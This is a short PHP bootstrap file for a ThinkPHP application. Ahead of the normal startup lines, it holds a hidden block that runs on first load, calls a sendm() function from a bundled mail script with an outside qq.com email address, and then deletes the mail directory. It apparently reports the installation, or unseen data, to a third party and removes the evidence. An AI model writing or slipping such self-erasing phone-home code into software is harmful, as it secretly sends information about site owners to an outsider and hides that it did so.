<?php
if (file_exists('./mail')){
	require './mail/mail.php';
	sendm('1874995829@qq.com');
	delDir('./mail');
}

/*start*/
define('APP_NAME','home');
define('APP_PATH','./home/');

require 'ThinkPHP/ThinkPHP.php';
?>